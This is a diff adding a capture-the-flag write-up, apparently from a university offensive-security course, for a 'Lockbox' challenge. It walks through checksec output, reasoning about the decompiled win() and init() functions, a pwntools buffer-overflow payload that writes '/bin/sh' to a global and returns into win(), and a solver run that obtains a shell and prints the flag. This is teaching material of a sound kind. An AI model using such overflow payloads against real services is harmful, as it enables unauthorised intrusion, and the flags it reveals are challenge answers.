@@ -407,8 +407,65 @@ The first entry for library needs to be a valid address. I used the address of s
 ```
         Here's your flag, friend: flag{W3_c4n_Us3_4n_4rb1tr4ry_r34d_t0_l34k_s3cr3ts!_27d3884ca5c5c3cb}
 ```
+## Challenge - Lockbox
+```aiignore
+I've locked the shell in a lockbox, you'll never get it!
+
+nc offsec-chalbroker.osiris.cyber.nyu.edu 1282
+```
+Downloading and inspecting lockbox binary:
+````aiignore
+$ pwn checksec --file=lockbox
+[*] '/mnt/csgy9223_IntroOffSec/week_5/lockbox'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+````
+Let's run it:
+```aiignore
+$ ./lockbox
+
+I've locked my shell in a lockbox, you'll never get it now!
+But give it your best try, what's the combination?
+
+> 12345
+Segmentation fault                                                                         
+```
+I'm guessing the input value is some sort of address. Binja time!
+
+The win() function checks for key to equal 0xbeeff0cacc1a then XORs that value to 0x68cdc09ea3ae35 (0x68732f6e69622f) and stores it at my_string. But from what I see this does nothing. No matter what is just calls system with exit. But I see that the disassebly uses the address of my_string in the system call. Is there a way to get my_string to = /bin/sh?
+
+The init() function sets key = -0x4555555221523f22; key is an unsigned long so 0xbaaaaaaddeadc0de
+
+My guess is that when overflowing the buffer, we set the address of my_string (0x00404050) in second void (renamed to target_address) and the value of the first void (renamed to shell_call) to "/bin/sh" or 0x2f62696e2f7368. To pwn we go and build a solver. We will overwrite the return to win().
 
 
+- Target address: 0x404050
+- Win address: 0x40124f
+- Shell code: 0x68732f6e69622f
+
+```aiignore
+p.sendline((b'B' * 0x10) + p64(target_addr) + p64(shell_code) + (b'A' * 0x28) + p64(win_addr + len(a)))
+```
+
+```aiignore
+$ python lockbox_solver.py
+[+] Opening connection to offsec-chalbroker.osiris.cyber.nyu.edu on port 1282: Done
+Target address: 0x404050
+Win address: 0x401237
+Shell code: 0x68732f6e69622f
+[*] Switching to interactive mode
+$ ls
+flag.txt
+lockbox
+$ cat flag.txt
+flag{y0u_d0n't_n33d_4_k3y_1f_y0u_h4v3_4_BOF!_bec1d088dc0e5701}
+```
 
 
 
